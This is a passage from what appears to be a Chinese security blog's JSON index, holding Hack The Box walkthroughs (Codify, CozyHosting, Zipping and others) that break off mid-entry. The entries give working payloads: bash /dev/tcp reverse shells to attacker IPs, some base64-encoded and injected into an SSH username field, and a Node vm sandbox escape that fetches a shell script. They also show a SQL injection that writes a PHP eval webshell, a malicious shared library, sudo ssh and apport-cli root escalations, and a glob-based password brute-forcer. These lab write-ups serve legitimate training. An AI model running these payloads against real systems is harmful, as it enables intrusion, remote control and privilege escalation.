ALL) /usr/bin/apport-cli Google一下sudo apport-cli，经过搜集，得到一个CVE-2023-1326 CVE-2023-13261.使用命令生成.crash文件 12345678#第一种sleep 100 &amp;ps aux|grep sleepkill -SEGV &lt;pid&gt;#第二种sleep 100 &amp;killall -SIGSEGV sleep 该文件在/var/crash目录下。 2.使用apport-cli处理该文件，选择V选项，该程序会使用less作为查看报告的方式。 1234sudo apport-cli -c /var/crash/xxx.crash输入：v等一段时间后输入：!/bin/bash即可得到shell 总结nmap发现开放80端口，是一个静态页面，没有找到利用点，接着信息搜集找到一个子域名dev,在这个子域名下找到joomla cms,并且可以发现后台登陆页面，再网上可以找到CVE-2023-23752,或者利用工具searchsploit Joomla得到账号密码，ssh登陆无果之后，用账号密码进入后台发现‎/templates/cassiopeia/error.php可以利用;连接webshell，从数据库中可以发现logan的密码，john爆破密码，登陆logan账号，sudo -l后发现可以sudo apport-cli再次利用CVE-2023-1326提升权限到root","link":"/2023/12/08/Devvortex(HTB)/"},{"title":"Codify(HTB)","text":"信息搜集12345sudo nmap -p- -sT --min-rate 3000 10.10.11.23922/tcp open ssh80/tcp open http3000/tcp open ppp 访问10.10.11.239 codify.htb添加到hosts,发现80端口和3000端口访问页面一样的,还有一个editor路由; 根据index.html，不难看出应该是nodejs的沙箱逃逸 123456789101112Test your Node.js code easily.This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time.Try it nowCodify is a simple web application that allows you to test your Node.js code easily. With Codify, you can write and run your code snippets in the browser without the need for any setup or installation.Whether you're a developer, a student, or just someone who wants to experiment with Node.js, Codify makes it easy for you to write and test your code without any hassle.Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system. Therefore this has some limitations. We try our best to reduce these so that we can give you a better experience.So why wait? Start using Codify today and start writing and testing your Node.js code with ease! 访问editor路由;存在运行nodejs代码的功能，猜测存在沙箱逃逸 沙箱逃逸在网上能找到相关poc，但是直接用反弹shell命令一直报错，换一种方式； 1234567┌──(kali㉿kali)-[~/桌面/Codify]└─$ cat shell /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.63/5555 0&gt;&amp;1 ┌──(kali㉿kali)-[~/桌面/Codify]└─$ python3 -m http.server nodejs沙箱逃逸这块确实不太懂，以后应该会出一篇博客；poc参考这篇博客clink me 123456789const vm = require('vm');const script = `const process = this.toString.constructor('return process')()process.mainModule.require('child_process').execSync('wget 10.10.14.63:8000/shell').toString()`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res) 123456789const vm = require('vm');const script = `const process = this.toString.constructor('return process')()process.mainModule.require('child_process').execSync(&quot;/bin/bash -i shell&quot;).toString()`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log(res) 连接到webshell之后，在/var/ww/concat下发现一个db文件，尝试从中得到敏感信息 12345678svc@codify:/var/www/contact$ pwd/var/www/contactsvc@codify:/var/www/contact$ lsindex.jspackage.jsonpackage-lock.jsontemplatestickets.db 在tickets.db数据库中也是成功发现一个账号密码 john爆破密码，在尝试ssh连接。是可以成功连接的 12john hash --wordlist=/usr/share/wordlists/rockyou.txtspongebob1 提权12345678joshua@codify:~$ sudo -l[sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh 查看/opt/scripts/mysql-backup.sh文件，似乎是一个备份数据库的sh 1234567891011121314151617181920212223242526272829#!/bin/bashDB_USER=&quot;root&quot;DB_PASS=$(/usr/bin/cat /root/.creds)BACKUP_DIR=&quot;/var/backups/mysql&quot;read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS/usr/bin/echoif [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo &quot;Password confirmed!&quot;else /usr/bin/echo &quot;Password confirmation failed!&quot; exit 1fi/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)for db in $databases; do /usr/bin/echo &quot;Backing up database: $db&quot; /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;done/usr/bin/echo &quot;All databases backed up successfully!&quot;/usr/bin/echo &quot;Changing the permissions&quot;/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;/usr/bin/echo 'Done!' 重点在这，判断输入的密码是否于root密码相同；==判断没有加引号，所以这里并不是字符串比较，这里允许通配符‘* 的存在的，这里的弱比较‘ == ’可以由此绕过, 123456if [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo &quot;Password confirmed!&quot;else /usr/bin/echo &quot;Password confirmation failed!&quot; exit 1fi 直接用python脚本跑出root的密码，这个脚本也是比较容易理解 123456789101112131415import subprocessimport stringdef run_command(command): output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode() return outputdic=string.ascii_letters+string.digitspassword=&quot;&quot;for i in range(100): for i in dic: output= run_command(f'echo &quot;{password}{i}*&quot; | sudo /opt/scripts/mysql-backup.sh') if &quot;Password confirmed&quot; in output: password+=i print(password) break 总结信息搜集到80.3000端口开放，且功能一样；editor路由下存在沙箱逃逸可以实现任意命令执行，反弹shell，得到svc用户，继续搜集在/var/ww/concat/tickets.db文件中可以得到用户名为joshua，用john爆破密码，用ssh连接；发现有(root) /opt/scripts/mysql-backup.sh是一个备份数据库的sh文件，其中存在==判断没加引号，允许通配符‘* 的存在的；写python脚本得到root密码","link":"/2023/12/09/Codify(HTB)/"},{"title":"CozyHosting(HTB)","text":"信息搜集nmap123456sudo nmap -p- -sT --min-rate 3000 10.10.11.230PORT STATE SERVICE22/tcp open ssh80/tcp open http dirsearch1234567891011121314151617181920dirsearch -u http://cozyhosting.htb/ [19:30:12] 200 - 0B - /Citrix//AccessPlatform/auth/clientscripts/cookies.js [19:30:18] 200 - 634B - /actuator [19:30:18] 200 - 5KB - /actuator/env [19:30:19] 200 - 48B - /actuator/sessions [19:30:19] 200 - 10KB - /actuator/mappings [19:30:19] 200 - 15B - /actuator/health [19:30:19] 200 - 124KB - /actuator/beans [19:30:19] 401 - 97B - /admin [19:30:36] 200 - 0B - /engine/classes/swfupload//swfupload.swf [19:30:36] 200 - 0B - /engine/classes/swfupload//swfupload_f9.swf [19:30:36] 500 - 73B - /error [19:30:37] 200 - 0B - /examples/jsp/%252e%252e/%252e%252e/manager/html/ [19:30:37] 200 - 0B - /extjs/resources//charts.swf [19:30:39] 200 - 0B - /html/js/misc/swfupload//swfupload.swf [19:30:41] 200 - 12KB - /index [19:30:43] 200 - 4KB - /login [19:30:43] 200 - 0B - /login.wdm%2e [19:30:43] 204 - 0B - /logout 寻找漏洞在dirseach中的/actuator/sessions 发现泄露了用户名和其session 198CE8721F7394050CE8CC45241821BAD &quot;kanderson&quot; 访问admin，用泄露的session尝试登陆，可以成功登陆 123456789GET /admin HTTP/1.1Host: cozyhosting.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeCookie: JSESSIONID=98CE8721F7394050CE8CC45241821BADUpgrade-Insecure-Requests: 1 其中存在一处连接ssh的功能，这里存在rce漏洞 利用漏洞经过测试发现对host和username均做了过滤处理，但是在username处只是不能包含空格，可以使用%0a和%09等URL编码绕过空格过滤。；username这里存在rce，但是不会有回显；但是可以给这条命令加上反引号导致回显(会将uid=1001(app)当作命令执行)，这有点像报错回显的感觉 HTTP 头中的 Location 字段用于指示客户端应该重定向到的 URL。当服务器返回带有 Location 头的响应时，客户端会自动重定向到指定的 URL。这通常用于实现页面重定向或者在需要时将客户端引导到另一个位置。Location 头通常与状态码 3xx（重定向）一起使用，以便告知客户端应该采取重定向操作。 于是构造payload反弹shell。(这后台还必须加一个分号才能反弹成功) 123bash -i&gt;&amp; /dev/tcp/10.10.16.45/5555 0&gt;&amp;1{echo,YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo=}|{base64,-d}|bash;%7Becho%2CYmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ1LzU1NTUgMD4mMQo%3D%7D%7C%7Bbase64%2C-d%7D%7Cbash; user-app12app@cozyhosting:/app$ lscloudhosting-0.0.1.jar 将cloudhosting-0.0.1.jar文件下载下来 123456方法一nc -nv 10.10.16.45 8888 &lt; cloudhosting-0.0.1.jarnc -lvvp 8888 &gt; cloudhosting-0.0.1.jar方法二python3 -m http.server 将文件用jd-gui反汇编，可以发现一对账号密码 cat /etc/passwd中确实存在postgres用户;尝试ssh登陆一直失败，尝试登陆数据库 123app:x:1001:1001::/home/app:/bin/shpostgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bashjosh:x:1003:1003::/home/josh:/usr/bin/bash psqlnetstat -pantu | grep &quot;5432&quot; netstat -pantu 是一个用于显示系统网络状态的命令。在这个命令中： -p 选项用于显示与进程相关的信息，包括进程 ID 和进程名称。 -a 选项用于显示所有的连接和监听端口。 -n 选项用于显示数字形式的 IP 地址和端口号，而不进行域名解析。 -t 选项用于显示 TCP 连接的信息。 -u 选项用于显示 UDP 连接的信息。 因此，netstat -pantu 命令会显示系统上所有的 TCP 和 UDP 连接，以及与这些连接相关的进程信息。 端口 5432 通常用于 PostgreSQL 数据库管理系统。这个端口是PostgreSQL默认的数据库访问端口，用于客户端应用程序连接到 PostgreSQL 服务器。 PostgreSQL 是一个流行的开源关系型数据库管理系统，常用于各种类型的应用程序和网站。 登陆数据库 123python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;psql -U postgres -h localhostPassword for user postgres: Vg&amp;nvzAQ7XxR 以下是一些常用的 psql 命令： 连接到数据库： 1psql -U username -d dbname -h hostname 列出数据库： 1\\l 连接到数据库： 1\\c dbname 列出表： 1\\dt 显示表结构： 1\\d table_name 退出 psql： 1\\q 在本题中敏感信息存放在cozyhosting库中的users表中 123456789cozyhosting=# select * from users;select * from users; name | password | role -----------+--------------------------------------------------------------+------- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi 爆破admin的密码居然是用户josh的密码，这就有点离谱了；这里直接用ssh可以连接 usr-josh12ssh josh@10.10.11.230manchesterunited #输入密码 sudo -l 1234567josh@cozyhosting:~$ sudo -l[sudo] password for josh: Matching Defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser josh may run the following commands on localhost: (root) /usr/bin/ssh * (root) /usr/bin/ssh *表示以root身份运行ssh，*表示可以使用任何参数 直接在这个网站寻找sshsudo提权；clink me 最终使用提权命令如下 1sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x 补充这是从cloudhosting-0.0.1.jar的一段代码；这应该就是实现ssh功能,过滤不当产生rce漏洞的地方 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package BOOT-INF.classes.htb.cloudhosting.compliance;import jakarta.servlet.http.HttpServletResponse;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.util.regex.Pattern;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class ComplianceService { private final Pattern HOST_PATTERN = Pattern.compile(&quot;^(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\\\\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\\\\.?$&quot;); @RequestMapping(method = {RequestMethod.POST}, path = {&quot;/executessh&quot;}) public void executeOverSsh(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;host&quot;) String host, HttpServletResponse response) throws IOException { StringBuilder rbuilder = new StringBuilder(&quot;/admin?error=&quot;); try { validateHost(host); validateUserName(username); Process process = Runtime.getRuntime().exec(new String[] { &quot;/bin/bash&quot;, &quot;-c&quot;, String.format(&quot;ssh -o ConnectTimeout=1 %s@%s&quot;, new Object[] { username, host }) }); (new BufferedReader(new InputStreamReader(process.getErrorStream()))).lines() .forEach(line -&gt; { if (!line.startsWith(&quot;Pseudo-terminal&quot;)) rbuilder.append(line); }); } catch (IllegalArgumentException exception) { rbuilder.append(exception.getMessage()); } catch (Exception exception) { rbuilder.append(&quot;ssh: Cannot connect to the host&quot;); } finally { response.sendRedirect(rbuilder.toString()); } } private void validateUserName(String username) { if (username.contains(&quot; &quot;)) throw new IllegalArgumentException(&quot;Username can't contain whitespaces!&quot;); } private void validateHost(String host) { if (!this.HOST_PATTERN.matcher(host).matches()) throw new IllegalArgumentException(&quot;Invalid hostname!&quot;); }} 总结namp搜集开放80端口；dirsearch搜集到/admin路由,/actuator/sessions 路由；/actuator/sessions 路由中泄露了用户kanderson的session，可以用这session登陆到admin;在admin页面处的ssh功能应过滤不当存在rce漏洞，以至于可以反弹shell,得到app用户；又能在app用户中得到cloudhosting-0.0.1.jar,而cloudhosting-0.0.1.jar存在敏感信息；账号：postgres，密码：Vg&amp;nvzAQ7XxR;尝试ssh连接不成功，连接数据库(这里注意是psql，从进程中得到这个信息)；在数据库里能找到用户josh的密码:manchesterunited;ssh连接成功,sudo -l发现可以以root身份运行ssh命令，在网上可以找到对应的提权方法，最终拿到root。","link":"/2023/12/11/CozyHosting(HTB)/"},{"title":"Zipping(HTB)","text":"信息搜集nmap12345sudo nmap -p- -sT -min-rate 3000 10.10.11.229PORT STATE SERVICE22/tcp open ssh80/tcp open http dirsearch1234dirsearch -u http://10.10.11.229/ [09:38:37] 301 - 311B - /shop -&gt; http://10.10.11.229/shop/ [09:38:46] 200 - 5KB - /upload.php 文件包含 /shop存在文件包含漏洞(只能包含php)，猜测源码是$page.&quot;php&quot;之类的 任意文件读取 /upload.php存在任意文件读取；上传单个以pdf为后缀压缩的zip文件；可以用软连接读取任意文件； 123456ln -s /etc/passwd pass.pdfls -l pass.pdflrwxrwxrwx 1 kali kali 11 12月13日 09:52 pass.pdf -&gt; /etc/passwdzip --symlinks pass.zip pass.pdf zip命令中的--symlinks选项用于指示zip命令在创建存档时如何处理符号链接。如果使用了–symlinks选项，zip命令将会存储符号链接本身，而不是符号链接所指向的文件。这意味着解压缩存档后，符号链接将会保留其链接关系，而不是被解压成实际的文件。 上传pass.zip文件，用bp抓包就可以读取到/etc/passwd；依次读取shop/index.php,/shop/cat.php等文件 1234567891011#/var/www/html/shop/index.php&lt;?phpsession_start();// Include functions and connect to the database using PDO MySQLinclude 'functions.php';$pdo = pdo_connect_mysql();// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.$page = isset($_GET['page']) &amp;&amp; file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';// Include and show the requested pageinclude $page . '.php';?&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#/var/www/html/shop/cat.php&lt;?php// If the user clicked the add to cart button on the product page we can check for the form dataif (isset($_POST['product_id'], $_POST['quantity'])) { // Set the post variables so we easily identify them, also make sure they are integer $product_id = $_POST['product_id']; $quantity = $_POST['quantity']; // Filtering user input for letters or special characters if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) { echo ''; } else { // Construct the SQL statement with a vulnerable parameter $sql = &quot;SELECT * FROM products WHERE id = '&quot; . $_POST['product_id'] . &quot;'&quot;; // Execute the SQL statement without any sanitization or parameter binding $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC); // Check if the product exists (array is not empty) if ($product &amp;&amp; $quantity &gt; 0) { // Product exists in database, now we can create/update the session variable for the cart if (isset($_SESSION['cart']) &amp;&amp; is_array($_SESSION['cart'])) { if (array_key_exists($product_id, $_SESSION['cart'])) { // Product exists in cart so just update the quanity $_SESSION['cart'][$product_id] += $quantity; } else { // Product is not in cart so add it $_SESSION['cart'][$product_id] = $quantity; } } else { // There are no products in cart, this will add the first product to cart $_SESSION['cart'] = array($product_id =&gt; $quantity); } } // Prevent form resubmission... header('location: index.php?page=cart'); exit; }}// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it's a number and check if it's in the cartif (isset($_GET['remove']) &amp;&amp; is_numeric($_GET['remove']) &amp;&amp; isset($_SESSION['cart']) &amp;&amp; isset($_SESSION['cart'][$_GET['remove']])) { // Remove the product from the shopping cart unset($_SESSION['cart'][$_GET['remove']]);}// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart pageif (isset($_POST['update']) &amp;&amp; isset($_SESSION['cart'])) { // Loop through the post data so we can update the quantities for every product in cart foreach ($_POST as $k =&gt; $v) { if (strpos($k, 'quantity') !== false &amp;&amp; is_numeric($v)) { $id = str_replace('quantity-', '', $k); $quantity = (int)$v; // Always do checks and validation if (is_numeric($id) &amp;&amp; isset($_SESSION['cart'][$id]) &amp;&amp; $quantity &gt; 0) { // Update new quantity $_SESSION['cart'][$id] = $quantity; } } } // Prevent form resubmission... header('location: index.php?page=cart'); exit;}// Send the user to the place order page if they click the Place Order button, also the cart should not be emptyif (isset($_POST['placeorder']) &amp;&amp; isset($_SESSION['cart']) &amp;&amp; !empty($_SESSION['cart'])) { header('Location: index.php?page=placeorder'); exit;}if (isset($_POST['clear'])) { unset($_SESSION['cart']);}// Check the session variable for products in cart$products_in_cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : array();$products = array();$subtotal = 0.00;// If there are products in cartif ($products_in_cart) { // There are products in the cart so we need to select those products from the database // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc) $array_to_question_marks = implode(',', array_fill(0, count($products_in_cart), '?')); $stmt = $pdo-&gt;prepare('SELECT * FROM products WHERE id IN (' . $array_to_question_marks . ')'); // We only need the array keys, not the values, the keys are the id's of the products $stmt-&gt;execute(array_keys($products_in_cart)); // Fetch the products from the database and return the result as an Array $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC); // Calculate the subtotal foreach ($products as $product) { $subtotal += (float)$product['price'] * (int)$products_in_cart[$product['id']]; }}?&gt; 1234567891011121314151617##/var/www/html/shop/products.php&lt;?php// The amounts of products to show on each page$num_products_on_each_page = 4;// The current page - in the URL, will appear as index.php?page=products&amp;p=1, index.php?page=products&amp;p=2, etc...$current_page = isset($_GET['p']) &amp;&amp; is_numeric($_GET['p']) ? (int)$_GET['p'] : 1;// Select products ordered by the date added$stmt = $pdo-&gt;prepare('SELECT * FROM products ORDER BY date_added DESC LIMIT ?,?');// bindValue will allow us to use an integer in the SQL statement, which we need to use for the LIMIT clause$stmt-&gt;bindValue(1, ($current_page - 1) * $num_products_on_each_page, PDO::PARAM_INT);$stmt-&gt;bindValue(2, $num_products_on_each_page, PDO::PARAM_INT);$stmt-&gt;execute();// Fetch the products from the database and return the result as an Array$products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);// Get the total number of products$total_products = $pdo-&gt;query('SELECT * FROM products')-&gt;rowCount();?&gt; 12345678910111213141516171819#/var/www/html/functions.php&lt;?phpfunction pdo_connect_mysql() { // Update the details below with your MySQL details $DATABASE_HOST = 'localhost'; $DATABASE_USER = 'root'; $DATABASE_PASS = 'MySQL_P@ssw0rd!'; $DATABASE_NAME = 'zipping'; try { return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS); } catch (PDOException $exception) { // If there is an error with the connection, stop the script and display the error. exit('Failed to connect to database!'); }}// Template header, feel free to customize thisfunction template_header($title) {$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;?&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041#/var/www/html/upload.php &lt;?php if(isset($_POST['submit'])) { // Get the uploaded zip file $zipFile = $_FILES['zipFile']['tmp_name']; if ($_FILES[&quot;zipFile&quot;][&quot;size&quot;] &gt; 300000) { echo &quot;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&quot;; } else { // Create an md5 hash of the zip file $fileHash = md5_file($zipFile); // Create a new directory for the extracted files $uploadDir = &quot;uploads/$fileHash/&quot;; $tmpDir = sys_get_temp_dir(); // Extract the files from the zip $zip = new ZipArchive; if ($zip-&gt;open($zipFile) === true) { if ($zip-&gt;count() &gt; 1) { echo '&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;'; } else { // Get the name of the compressed file $fileName = $zip-&gt;getNameIndex(0); if (pathinfo($fileName, PATHINFO_EXTENSION) === &quot;pdf&quot;) { $uploadPath = $tmpDir.'/'.$uploadDir; echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '&gt;/dev/null'); if (file_exists($uploadPath.$fileName)) { mkdir($uploadDir); rename($uploadPath.$fileName, $uploadDir.$fileName); } echo '&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&quot;'.$uploadDir.$fileName.'&quot;&gt;'.$uploadDir.$fileName.'&lt;/a&gt;'.'&lt;/p&gt;'; } else { echo &quot;&lt;p&gt;The unzipped file must have a .pdf extension.&lt;/p&gt;&quot;; } } } else { echo &quot;Error uploading file.&quot;; } } } ?&gt; 代码审计+sql四个文件基本存在漏洞点的地方就是在cart.php的sql查询中 1234567if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) { echo ''; } else { // Construct the SQL statement with a vulnerable parameter $sql = &quot;SELECT * FROM products WHERE id = '&quot; . $_POST['product_id'] . &quot;'&quot;; // Execute the SQL statement without any sanitization or parameter binding $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC); 要想办法绕过&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;;这个正则匹配就是：如果你是以A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?这其中的字符开头或者以一个非数字结尾的话就会匹配成功 ^：匹配输入的开始位置。 .*：匹配任意字符（除换行符之外）零次或多次。 [A-Za-z!#$%^&amp;*()-_=+{}[]\\|;:’”,.&lt;&gt;/?]：匹配任意一个字母或特殊字符。 |：表示或者的意思。 [^0-9]：匹配除数字之外的任意字符。 $：匹配输入的结束位置。 我们这里就是利用了.*不匹配\\n的特性来绕过正则匹配的 并且$pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);存在堆叠注入 webshell现在思路比较清楚了，利用sql注入 into outfile上传木马，再文件包含木马；为什么要包含？直接把🐎放在/var/www/html/下，在访问不就可以了吗？确实，想的很美好；但是在上马的过程中会发现/var/www/html/一直不成功，猜测是没有权限，只能将🐎放在其他有权限的地方，再包含利用。 1%0a'; select '&lt;?php phpinfo();eval($_REQUEST[1]);?&gt;' into outfile '/var/lib/mysql/shell.php'; --1 123456789101112131415POST /shop/index.php?page=cart HTTP/1.1Host: 10.10.11.229User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 163Origin: http://10.10.11.229Connection: closeReferer: http://10.10.11.229/shop/index.php?page=product&amp;id=1Cookie: PHPSESSID=7c043nqbhm56rmfbgitd4vestcUpgrade-Insecure-Requests: 1quantity=1&amp;product_id=%0a'%3B%20select%20'%3C%3Fphp%20phpinfo()%3Beval(%24_REQUEST%5B1%5D)%3B%3F%3E'%20into%20outfile%20'%2Fvar%2Flib%2Fmysql%2Fshell.php'%3B%20--1 再反弹webshell,成功拿到rektsu用户 1234&quot;/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.13/5555 0&gt;&amp;1'&quot;%22%2Fbin%2Fbash%20-c%20'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261'%22POST:1=system(%22%2Fbin%2Fbash%20-c%20'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261'%22); 成功拿到shell，我们再回去看一下之前没有上传成功是不是没有权限导致的； 12345678rektsu@zipping:/var/www$ ls -l /var/wwwdrwxr-xr-x 5 root rektsu 4096 Sep 5 14:25 htmlrektsu@zipping:/var/www$ ls /var/www/html -ldrwxrwxr-x 3 root rektsu 4096 Dec 13 02:46 shoprektsu@zipping:/var/www$ ls -l /var/libdrwxr-xr-x 6 mysql mysql 4096 Dec 13 02:51 mysql 这里有就有点懵逼了，为什么/var/www/html/shop有权限却没有上传成功;/var/lib/mysql没有权限却成功了，奇怪； 后来又想了一下是sql对写入文件的目录有限制 在MySQL中，secure_file_priv变量用于限制INTO OUTFILE语句写入文件的目录。如果该变量没有设置或者设置为空，那么MySQL服务器将使用默认的数据目录来保存文件。 登陆数据库看一下；果然和我猜想的一样；为空，使用默认的数据目录来保存文件 12345678mysql -h localhost -u root -pMySQL_P@ssw0rd!SHOW VARIABLES LIKE 'secure_file_priv';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | |+------------------+-------+ 提权sudo -l发现可以运行一个二进制文件/usr/bin/stock； 12345678rektsu@zipping:/var/www$ sudo -lsudo -lMatching Defaults entries for rektsu on zipping: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser rektsu may run the following commands on zipping: (ALL) NOPASSWD: /usr/bin/stock 将/usr/bin/stock文件下载到本地gdb调试； 这里要我们输入密码，我们不知道，先输入垃圾字符 这个存在一个checkAuth,应该是验证密码的函数，按s跟进看一下这个函数在干嘛 可以看到将我们输入的字符与St0ckM4nager作比较；说明St0ckM4nager就是password 第二次调试：输入正确的密码，看看下面会执行什么 这里调用了dlopen函数并且文件名是/home/rektsu/.config/libcounter.so 在C语言中，dlopen函数用于动态加载共享库（也称为动态链接库）并返回一个句柄，以便在运行时使用库中的函数和符号。 一下就想到LD-PRELOAD劫持so文件到达提权的目的。ls -l /home/rektsu/.config/libcounter.so 并没有这个文件。需要我们再本地制作恶意的动态链接库； 1234#include &lt;stdlib.h&gt;void _init() { system(&quot;/bin/bash&quot;);} 生成恶意动态链接库：gcc hack.c -fPIC -shared -o libcounter.so -nostartfiles 123456wget 10.10.16.13:8000/libcounter.sosudo /usr/bin/stockSt0ckM4nageriduid=0(root) gid=0(root) groups=0(root) 总结nmap搜集到80端口开放；dirsearch搜集/upload.php,/shop;其中/shop/index?page=存在包含任意php文件漏洞；/upload.php存在任意文件读取，读取到/var/www/html/shop/cart.php发现存在sql注入；可以利用into outfile注入🐎；再利用文件包含🐎；反弹shell得到rektsu用户；sudo -l发现sudo运行/usr/bin/stock文件，下载到本地调试，发现stock加载了动态链接库/home/rektsu/.config/libcounter.so;劫持动态链接库来提权。","link":"/2023/12/13/Zipping(HTB)/"},{"title":"Clicker(HTB)","text":"信息搜集nmap12345678910sudo nmap -p- -sT -min-rate 4000 10.10.11.232PORT STATE SERVICE22/tcp open ssh80/tcp open http111/tcp open rpcbind2049/tcp open nfs8000/tcp open http-alt36831/tcp open unknown41197/tcp open unknown59535/tcp open unknown NSF泄露备份文件2049/tcp open nfs NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享,以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。 123456789101112┌──(kali㉿kali)-[~]└─$ showmount -e 10.10.11.232 Export list for 10.10.11.232:/mnt/backups *#/mnt/backups目录被以只读方式（*）共享出来，这意味着其他主机可以通过NFS协议挂载这个目录，并且只能以只读方式访问其中的文件。sudo mount -t nfs 10.10.11.232:/mnt/backups /tmp/clickersudo cp ./clicker.htb_backup.zip /home/kaliunzip clicker.htb_backup.zip 1234567891011121314151617总计 64-rw-rw-r-- 1 kali kali 3934 9月 2日 04:18 